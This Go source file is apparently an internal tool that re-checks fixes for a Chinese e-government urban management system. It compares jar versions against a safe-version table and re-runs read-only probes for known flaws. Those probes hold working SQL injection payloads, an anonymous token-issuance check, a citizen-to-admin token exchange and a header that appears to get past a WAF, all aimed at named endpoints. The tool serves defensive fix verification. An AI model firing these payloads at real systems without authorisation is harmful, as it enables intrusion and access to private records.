package harden

// sec_knowledge.go —— 知识库三类问题自动复检（Go 原生，随 eops 二进制交付）。
//
// 事实源：D:/opencode/file/2026-11-16/sec_auto_check/knowledge.json（v2026-11-16，
// 最近2年安全数据三类拆分：配置 CFG / 代码 CODE / 依赖 DEP）。
// 本文件是 knowledge.json 的 Go 侧落地：DEP 表与 CODE 检查规格与 knowledge.json
// 同源，改 knowledge.json 时同步改 DepTable 与 codeSpecs 注释。
//
// 三类映射：
//   配置类 -> 复用本包已有 RunExposureCheck/Nginx/Tomcat/OS/Network/CN/AppConfig；
//   代码类 -> 本文件 RunKnowledgeCodeCheck（只读 HTTP 复现，生产只读口径）；
//   依赖类 -> 本文件 RunKnowledgeDepCheck（jar 文件名版本比对；
//             公司版本库可 --company-db 覆盖；互联网最新版可 fetch 后离线导入）。
//
// 红线：CODE-01/07 涉及写（换绑）默认不执行，只判 UNKNOWN；
// CODE-04 只取 pageSize=1；CODE-10 换票后不消费 bearer；不 dump 业务行。

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"time"
)

// ---------------------------------------------------------------- 依赖表 --

// DepEntry 依赖升级类条目（与 knowledge.json DEP 项同源）。
type DepEntry struct {
	Artifact string // group:name
	Company  string // 公司在用最新（公司版本库未提供前 = 清单基线）
	Safe     string // 安全版本前导（低于此即 VULN；空=无版本结论）
	Title    string
	EOL      bool // true=无可用安全版本（EOL），须迁移/删除而非升级
}

// DepTable 知识库依赖表（28 jar 项，源自 tools/conf/secure-versions.flat，2026-11-16 四路官方源核实）。
func DepTable() []DepEntry {
	return []DepEntry{
		{"org.apache.axis:axis", "", "", "axis", true},
		{"org.apache.axis:axis-saaj", "", "", "axis-saaj", true},
		{"commons-collections:commons-collections", "", "3.2.2", "commons-collections", false},
		{"org.apache.commons:commons-collections4", "", "4.1", "commons-collections4", false},
		{"commons-fileupload:commons-fileupload", "", "1.6.0", "commons-fileupload", false},
		{"org.apache.commons:commons-text", "", "1.10.0", "commons-text", false},
		{"com.alibaba.fastjson:fastjson", "", "1.2.84", "fastjson", false},
		{"com.h2database:h2", "", "2.2.220", "h2", false},
		{"com.fasterxml.jackson.core:jackson-databind", "", "2.18.12", "jackson-databind", false},
		{"org.apache.logging.log4j:log4j-api", "", "2.25.5", "log4j-api", false},
		{"org.apache.logging.log4j:log4j-core", "", "2.25.5", "log4j-core", false},
		{"org.apache.logging.log4j:log4j-jcl", "", "2.25.5", "log4j-jcl", false},
		{"org.apache.logging.log4j:log4j-slf4j-impl", "", "2.25.5", "log4j-slf4j-impl", false},
		{"org.apache.logging.log4j:log4j-web", "", "2.25.5", "log4j-web", false},
		{"mysql:mysql-connector-java", "", "8.0.33", "mysql-connector-java", false},
		{"org.apache.poi:poi-ooxml", "", "5.4.0", "poi-ooxml", false},
		{"org.apache.poi:poi-ooxml-schemas", "", "", "poi-ooxml-schemas", true},
		{"org.apache.poi:poi-scratchpad", "", "5.4.0", "poi-scratchpad", false},
		{"org.postgresql:postgresql", "", "42.4.4", "postgresql", false},
		{"org.apache.rocketmq:rocketmq-client", "", "4.9.8", "rocketmq-client", false},
		{"org.apache.rocketmq:rocketmq-common", "", "4.9.8", "rocketmq-common", false},
		{"org.apache.rocketmq:rocketmq-logging", "", "4.9.8", "rocketmq-logging", false},
		{"org.apache.rocketmq:rocketmq-remoting", "", "4.9.8", "rocketmq-remoting", false},
		{"org.yaml:snakeyaml", "", "2.0", "snakeyaml", false},
		{"org.springframework:spring-web", "", "", "spring-web", true},
		{"org.springframework:spring-webmvc", "", "", "spring-webmvc", true},
		{"com.thoughtworks.xstream:xstream", "", "1.4.21", "xstream", false},
		{"net.lingala.zip4j:zip4j", "", "2.11.3", "zip4j", false},
	}
}

// ---------------------------------------------------------------- 版本比较 --

// CompareMavenVersion 比较 Maven 版本：<0 a<b；0 相等；>0 a>b。
func CompareMavenVersion(a, b string) int {
	pa := splitVer(a)
	pb := splitVer(b)
	for i := 0; i < len(pa) || i < len(pb); i++ {
		var x, y string
		if i < len(pa) {
			x = pa[i]
		}
		if i < len(pb) {
			y = pb[i]
		}
		if x == y {
			continue
		}
		xn, xerr := strconv.Atoi(x)
		yn, yerr := strconv.Atoi(y)
		if xerr == nil && yerr == nil {
			if xn != yn {
				if xn < yn {
					return -1
				}
				return 1
			}
			continue
		}
		// 修饰符：SNAPSHOT < RC/alpha/beta < 无修饰符（release）
		rx, ry := rankQualifier(x), rankQualifier(y)
		if rx != ry {
			if rx < ry {
				return -1
			}
			return 1
		}
		if x < y {
			return -1
		}
		return 1
	}
	return 0
}

func splitVer(v string) []string {
	v = strings.TrimSpace(v)
	if v == "" {
		return nil
	}
	return regexp.MustCompile(`[.\-_]`).Split(v, -1)
}

func rankQualifier(s string) int {
	u := strings.ToUpper(s)
	switch {
	case u == "" || u == "RELEASE" || u == "FINAL":
		return 3
	case strings.HasPrefix(u, "SNAPSHOT"):
		return 0
	case strings.HasPrefix(u, "ALPHA") || strings.HasPrefix(u, "BETA") ||
		strings.HasPrefix(u, "RC") || strings.HasPrefix(u, "M") || strings.HasPrefix(u, "PRE"):
		return 1
	default:
		return 2
	}
}

// ---------------------------------------------------------------- 公司库/互联网缓存 --

// CompanyDB: artifact -> {company, safe}（公司提供版本库，未提供时用 DepTable 内置值）。
type CompanyDB map[string][2]string

// LoadCompanyDB 读公司版本库 JSON：{"group:name": {"company": "x", "safe": "y"}}。
func LoadCompanyDB(path string) (CompanyDB, error) {
	db := CompanyDB{}
	raw, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	var m map[string]map[string]string
	if err := json.Unmarshal(raw, &m); err != nil {
		return nil, err
	}
	for k, v := range m {
		db[k] = [2]string{v["company"], v["safe"]}
	}
	return db, nil
}

// isEOLDep 该依赖是否无可用安全版本（EOL）。
func isEOLDep(key string) bool {
	for _, e := range DepTable() {
		if e.Artifact == key {
			return e.EOL
		}
	}
	return false
}

// DefaultCompanyDB 内置表转 CompanyDB。
func DefaultCompanyDB() CompanyDB {
	db := CompanyDB{}
	for _, e := range DepTable() {
		db[e.Artifact] = [2]string{e.Company, e.Safe}
	}
	return db
}

// LoadMavenCache 读互联网最新版缓存：{"latest": {"group:name": "x.y.z"}}（fetch 下载后离线导入）。
func LoadMavenCache(path string) map[string]string {
	out := map[string]string{}
	raw, err := os.ReadFile(path)
	if err != nil {
		return out
	}
	var m struct {
		Latest map[string]string `json:"latest"`
	}
	if err := json.Unmarshal(raw, &m); err != nil {
		return out
	}
	return m.Latest
}

// FetchMavenLatest 在线拉 Maven Central 最新版本（联网环境执行，结果存文件供离线导入）。
func FetchMavenLatest(artifacts []string) map[string]string {
	out := map[string]string{}
	for _, art := range artifacts {
		g, n := splitArtifact(art)
		if v := mavenLatest(g, n); v != "" {
			out[art] = v
		}
	}
	return out
}

func splitArtifact(art string) (string, string) {
	p := strings.SplitN(art, ":", 2)
	if len(p) != 2 {
		return art, art
	}
	return p[0], p[1]
}

func mavenLatest(group, name string) string {
	q := fmt.Sprintf(`g:"%s" AND a:"%s"`, group, name)
	u := "https://search.maven.org/solrsearch/select?q=" + url.QueryEscape(q) + "&rows=1&wt=json"
	c := &http.Client{Timeout: 20 * time.Second}
	req, _ := http.NewRequest("GET", u, nil)
	req.Header.Set("User-Agent", "eops-sec-knowledge/1.0")
	resp, err := c.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	var d struct {
		Response struct {
			Docs []struct {
				LatestVersion string `json:"latestVersion"`
			} `json:"docs"`
		} `json:"response"`
	}
	if err := json.Unmarshal(body, &d); err != nil || len(d.Response.Docs) == 0 {
		return ""
	}
	return d.Response.Docs[0].LatestVersion
}

// isVersionLike 判断是否为可比对的版本号（数字开头；占位文案如“见公司版本库”跳过比对）。
func isVersionLike(s string) bool {
	if s == "" {
		return false
	}
	c := s[0]
	return c >= '0' && c <= '9'
}

var jarNameRe = regexp.MustCompile(`^(.+?)-(\d[\w.\-]*)\.jar$`)

// JarHit 远端发现的建档 jar。
type JarHit struct {
	Path    string
	Short   string // 文件短名 artifact 部分
	Version string
}

// shortNameVersion 从 jar 文件名解析短名与版本（与 scan_vulnerable_jar.sh 同口径）。
func shortNameVersion(base string) (string, string) {
	m := jarNameRe.FindStringSubmatch(base)
	if m == nil {
		return strings.TrimSuffix(base, ".jar"), ""
	}
	return m[1], m[2]
}

// matchDepKey jar 短名匹配依赖表（忽略 -/_ 大小写）。
func matchDepKey(short string, db CompanyDB) string {
	a := strings.ToLower(strings.ReplaceAll(short, "_", "-"))
	for k := range db {
		name := strings.ToLower(strings.SplitN(k, ":", 2)[1])
		if name == a {
			return k
		}
	}
	for k := range db {
		if strings.Contains(strings.ToLower(k), a) {
			return k
		}
	}
	return ""
}

// KnowledgeDepOptions 依赖检查选项。
type KnowledgeDepOptions struct {
	ScanDirs   []string          // 远端扫描目录（默认 /egova/apps /egova/web）
	Company    CompanyDB         // 公司库（nil 用内置）
	MavenCache map[string]string // 互联网最新版缓存（离线导入；nil 不比对最新）
}

// RunKnowledgeDepCheck 依赖类：远端 find jar 文件名版本 vs 公司/安全/互联网最新。
func RunKnowledgeDepCheck(host string, o KnowledgeDepOptions, r *SecReport) {
	db := o.Company
	if db == nil {
		db = DefaultCompanyDB()
	}
	dirs := o.ScanDirs
	if len(dirs) == 0 {
		dirs = []string{"/egova/apps", "/egova/web", "/egova/egova_apps"}
	}
	out, err := remoteRun("find /egova/apps /egova/web /egova/egova_apps -name '*.jar' 2>/dev/null")
	if err != nil || strings.TrimSpace(out) == "" {
		r.Add(SecFinding{Host: host, Category: "知识库复检-依赖", Item: "DEP 扫描",
			Result: "未发现 jar（目录不存在或无权限）", Level: SecInfo,
			Advice: "确认应用目录是否在白名单路径", Fixable: "no"})
		return
	}
	_ = dirs
	seen := map[string]bool{}
	for _, line := range strings.Split(out, "\n") {
		p := strings.TrimSpace(line)
		if p == "" || !strings.HasSuffix(p, ".jar") {
			continue
		}
		base := p[strings.LastIndex(p, "/")+1:]
		short, ver := shortNameVersion(base)
		key := matchDepKey(short, db)
		if key == "" || seen[key+"@"+ver] {
			continue
		}
		seen[key+"@"+ver] = true
		cs := db[key]
		company, safe := cs[0], cs[1]
		if safe == "" {
			safe = company
		}
		if isEOLDep(key) {
			r.Add(SecFinding{Host: host, Category: "知识库复检-依赖", Item: key,
				Result:   fmt.Sprintf("%s 当前%s 无可用安全版本（EOL），须迁移/删除依赖", key, ver),
				Evidence: "jar: " + p, Level: SecHigh,
				Advice: "按清单更新方式迁移（Axis2/jakarta/删依赖），重启服务", Fixable: "no"})
			continue
		}
		level := SecInfo
		result := fmt.Sprintf("%s 当前%s 公司%s 安全%s", key, ver, company, safe)
		fixable := "no"
		advice := "已达标；升级需研发确认兼容性后推进"
		switch {
		case ver != "" && isVersionLike(safe) && CompareMavenVersion(ver, safe) < 0:
			level = SecCritical
			result = fmt.Sprintf("%s 当前%s 低于安全版本%s", key, ver, safe)
			advice = "升级到安全版本并回归验证（现场先定位，后续推进升级）"
		case ver != "" && isVersionLike(company) && CompareMavenVersion(ver, company) < 0:
			level = SecHigh
			result = fmt.Sprintf("%s 当前%s 低于公司在用最新%s", key, ver, company)
			advice = "与公司版本库对齐升级"
		case ver != "" && (!isVersionLike(safe) || !isVersionLike(company)):
			level = SecInfo
			result = fmt.Sprintf("%s 当前%s（公司库/安全版本待补充，仅登记）", key, ver)
			advice = "等公司版本库提供目标版本后再判定"
		}
		latest := ""
		if o.MavenCache != nil {
			latest = o.MavenCache[key]
			if latest != "" && ver != "" && CompareMavenVersion(ver, latest) < 0 && level != SecCritical && level != SecHigh {
				result += fmt.Sprintf("；互联网最新%s可评估升级", latest)
			}
		}
		r.Add(SecFinding{Host: host, Category: "知识库复检-依赖", Item: key,
			Result: result, Evidence: "jar: " + p, Level: level,
			Advice: advice, Fixable: fixable})
	}
}

// ---------------------------------------------------------------- 代码复现 --

// KnowledgeCodeOptions 代码类选项（控制机直连目标站，只读）。
type KnowledgeCodeOptions struct {
	Target       string // 如 https://egova.sqszhcg.com
	TokenMis     string
	CitizenToken string
}

var codeHTTP = &http.Client{
	Timeout: 20 * time.Second,
	Transport: &http.Transport{
		TLSClientConfig: &tls.Config{MinVersion: tls.VersionTLS12},
	},
}

func codeGet(base, path string, params map[string]string, app string) (int, []byte) {
	u := base + path + "?" + url.Values(toValues(params)).Encode()
	_ = u
	vals := url.Values{}
	for k, v := range params {
		vals.Set(k, v)
	}
	req, _ := http.NewRequest("GET", base+path+"?"+vals.Encode(), nil)
	req.Header.Set("Accept", "application/json, text/plain, */*")
	req.Header.Set("User-Agent", "eops-sec-knowledge/1.0")
	if app == "gis" {
		req.Header.Set("X-App-Id", "gis")
		req.Header.Set("App-Id", "gis")
		req.Header.Set("x-waf-code", "10021")
	} else {
		req.Header.Set("X-App-Id", "mis")
		req.Header.Set("App-Id", "mis")
		req.Header.Set("X-Waf-Code", "10021")
	}
	resp, err := codeHTTP.Do(req)
	if err != nil {
		return 0, []byte(err.Error())
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	return resp.StatusCode, body
}

func toValues(m map[string]string) map[string][]string {
	o := map[string][]string{}
	for k, v := range m {
		o[k] = []string{v}
	}
	return o
}

func contactsCount(base, tokenMis, search string) (int, int) {
	st, body := codeGet(base, "/eUrbanMIS/mi/misys/contact/searchallcontact",
		map[string]string{"searchName": search, "token": tokenMis, "access_token": tokenMis}, "mis")
	if st == 401 {
		return st, -2
	}
	var d struct {
		Data struct {
			Contacts []json.RawMessage `json:"contacts"`
		} `json:"data"`
	}
	if err := json.Unmarshal(body, &d); err != nil || d.Data.Contacts == nil {
		return st, -1
	}
	return st, len(d.Data.Contacts)
}

// RunKnowledgeCodeCheck 代码类只读复现（VULN=未修复 FIXED=已修复 UNKNOWN=需人工/缺凭证）。
func RunKnowledgeCodeCheck(o KnowledgeCodeOptions, r *SecReport) {
	host := o.Target
	add := func(item, status, evidence string) {
		lv := SecInfo
		if status == "VULN" {
			lv = SecCritical
		}
		r.Add(SecFinding{Host: host, Category: "知识库复检-代码", Item: item,
			Result: status + " " + evidence, Level: lv,
			Advice: "代码修复（参数化/鉴权拦截）后用本检查复验", Fixable: "no"})
	}
	if o.TokenMis != "" {
		_, nb := contactsCount(o.Target, o.TokenMis, "派遣员")
		_, nt := contactsCount(o.Target, o.TokenMis, "派遣员' AND (SELECT 1)=1 -- ")
		_, nf := contactsCount(o.Target, o.TokenMis, "派遣员' AND (SELECT 1)=2 -- ")
		switch {
		case nb == -2:
			add("CODE-02/08", "UNKNOWN", "token_mis 无效或过期（401）")
		case nt >= 0 && nf >= 0 && nt != nf && nt == nb:
			add("CODE-02/08", "VULN", fmt.Sprintf("布尔信道成立 真=%d 假=%d 基线=%d", nt, nf, nb))
		case nt == nf && nt >= 0:
			add("CODE-02/08", "FIXED", "真假无差异，疑似已参数化")
		default:
			add("CODE-02/08", "UNKNOWN", "响应异常")
		}
		// CODE-05：布尔长度差
		g := func(sub string) int {
			_, b := codeGet(o.Target, "/eUrbanMIS/statiscenter/reccenter/event/type/sub/top",
				map[string]string{"dateType": "6", "dateValue": "2026-11-01,2026-11-11",
					"subTypeIDs": sub, "token": o.TokenMis, "access_token": o.TokenMis}, "mis")
			return len(b)
		}
		lt, lf := g("80341/**/and/**/1=1,80345"), g("80341/**/and/**/1=2,80345")
		if lt != lf && lt > 0 {
			add("CODE-05", "VULN", fmt.Sprintf("布尔差异成立 真%dB 假%dB", lt, lf))
		} else if lt == lf && lt > 0 {
			add("CODE-05", "FIXED", "真假无差异")
		} else {
			add("CODE-05", "UNKNOWN", "响应异常或 token 无效")
		}
		// CODE-06：单引号回显 + 布尔
		g2 := func(rec string) (int, string) {
			st, b := codeGet(o.Target, "/eUrbanMIS/statiscenter/recanalysis/district/getantiquerydata",
				map[string]string{"dateType": "6", "dateValue": "2023-11-01,2023-11-30",
					"regionType": "1", "regionId": "1", "pageNum": "1", "pageSize": "5",
					"humanID": "892", "recTypeIDs": rec,
					"token": o.TokenMis, "access_token": o.TokenMis}, "mis")
			return st, string(b)
		}
		_, tq := g2("1'")
		_, tt := g2("1)/**/or/**/(1=1")
		_, tf := g2("1)/**/or/**/(1=2")
		switch {
		case strings.Contains(tq, "SQLSyntaxErrorException") || strings.Contains(strings.ToLower(tq), "select rec_id"):
			add("CODE-06", "VULN", "单引号回显完整SQL原文")
		case len(tt) != len(tf):
			add("CODE-06", "VULN", "布尔 totalRows 差异成立")
		default:
			add("CODE-06", "FIXED", "无回显且真假无差异")
		}
		add("CODE-09", "UNKNOWN", "需 A 票读 B 档案对照；CODE-01 未修复则大概率未修复")
	} else {
		for _, id := range []string{"CODE-02/08", "CODE-05", "CODE-06", "CODE-09"} {
			add(id, "UNKNOWN", "缺少 token_mis，无法判定")
		}
	}
	// CODE-03 匿名签发
	st3, b3 := codeGet(o.Target, "/eUrbanGIS/home/gis/token/getbuildertoken",
		map[string]string{"tcode": "Aaa123"}, "gis")
	tk := extractTk(b3)
	if tk != "" || (st3 == 200 && len(b3) > 20 && strings.Contains(strings.ToLower(string(b3)), "tk")) {
		add("CODE-03", "VULN", fmt.Sprintf("匿名签发成功（tk长度%d）", len(tk)))
		// CODE-04：匿名读 1 条
		_, b4 := codeGet(o.Target, "/eUrbanGIS/home/gis/event/geteventinfosa.htm",
			map[string]string{"condition": "", "queryType": "1", "page": "1", "pageSize": "1",
				"usePage": "1", "queryFrom": "1", "queryID": "", "tk": tk}, "gis")
		s4 := string(b4)
		if strings.Contains(s4, "patrolName") || strings.Contains(s4, "coordinateX") ||
			strings.Contains(s4, "address") || strings.Contains(s4, "案件") {
			add("CODE-04", "VULN", "匿名tk读出业务字段（pageSize=1 判定性读取）")
		} else {
			add("CODE-04", "FIXED", "匿名tk未返回业务数据")
		}
	} else {
		add("CODE-03", "FIXED", fmt.Sprintf("匿名签发失败 st=%d", st3))
		add("CODE-04", "UNKNOWN", "前置匿名签发失败，无法判定事件接口")
	}
	// CODE-10 市民换票
	if o.CitizenToken != "" {
		_, b10 := codeGet(o.Target, "/eGovaPublic/mi/user/union-auth-token-exchange/l",
			map[string]string{"token": o.CitizenToken, "isJsonp": "0",
				"cityCode": "277", "terminalID": "7"}, "mis")
		var d struct {
			Success bool `json:"success"`
			Data    struct {
				AdminSSO map[string]string `json:"admin_sso_token"`
			} `json:"data"`
		}
		if err := json.Unmarshal(b10, &d); err == nil && d.Success && len(d.Data.AdminSSO) > 0 {
			add("CODE-10", "VULN", "市民token换出 admin_sso_token（未消费）")
		} else {
			add("CODE-10", "FIXED", "换票失败")
		}
	} else {
		add("CODE-10", "UNKNOWN", "缺少 citizen-token，无法判定")
	}
	add("CODE-01", "UNKNOWN", "涉及换绑写操作，默认不执行；测试环境自测+复位")
	add("CODE-07", "UNKNOWN", "涉及换绑写操作，默认不执行；测试号自测+换回")
}

// extractTk 从签发响应里提取 tk（兼容多种字段名）。
func extractTk(body []byte) string {
	var d map[string]json.RawMessage
	if err := json.Unmarshal(body, &d); err != nil {
		return ""
	}
	for _, k := range []string{"tk", "token", "data"} {
		raw, ok := d[k]
		if !ok {
			continue
		}
		var s string
		if json.Unmarshal(raw, &s) == nil && len(s) > 8 {
			return s
		}
		var m map[string]string
		if json.Unmarshal(raw, &m) == nil {
			for _, kk := range []string{"tk", "token", "access_token"} {
				if m[kk] != "" {
					return m[kk]
				}
			}
		}
	}
	return ""
}

// SortedDepKeys 依赖表 artifact 排序（fetch 用）。
func SortedDepKeys(db CompanyDB) []string {
	ks := make([]string, 0, len(db))
	for k := range db {
		ks = append(ks, k)
	}
	sort.Strings(ks)
	return ks
}
